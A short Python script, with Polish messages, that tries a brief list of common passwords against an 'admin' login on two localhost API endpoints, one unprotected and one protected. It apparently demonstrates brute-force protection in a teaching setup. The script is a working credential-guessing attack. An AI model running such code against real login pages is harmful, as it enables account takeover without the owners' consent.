import requests

url = "http://localhost:8000/api/insecured-login/" 
url_protected = "http://localhost:8000/api/secured-login/"

username = "admin"
password_list = ["123456", "password", "letmein", "qwerty", "admin"]

def brute_force_password(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={"username": username, "password": password})
        if "Zalogowano pomyślnie!" in response.text:
            print(f"[+] Złamano hasło! Użytkownik: {username} | Hasło: {password}")
            break
        else:
            print('Status code: ', response.status_code)
            print(f"[-] Nieprawidłowe hasło: {password}")

print('-----------------Insecured login endpoint: -----------------')
brute_force_password_unprotected = brute_force_password(url, username, password_list)
print('\n----------------- Secured login endpoint -----------------')
brute_force_password_protected = brute_force_password(url_protected, username, password_list)









